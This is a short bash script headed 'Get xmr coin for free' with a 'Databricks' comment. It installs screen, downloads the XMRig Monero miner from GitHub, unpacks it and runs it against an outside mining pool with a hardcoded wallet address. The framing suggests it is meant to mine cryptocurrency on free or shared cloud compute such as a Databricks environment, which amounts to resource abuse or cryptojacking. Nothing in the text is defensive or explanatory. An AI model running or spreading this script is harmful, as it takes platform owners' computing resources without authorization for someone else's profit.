#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o sg.minexmr.com:443 -u 83bJ49DQHNfJeyLrBEdVKjFmTXBZiLYxe2976HXBacgW3cuoAGwHBXPfyMWesVVU8DbEnRogQ8RvKMNjgFL1hRufRjZMLvg -k --tls --rig-id GC1
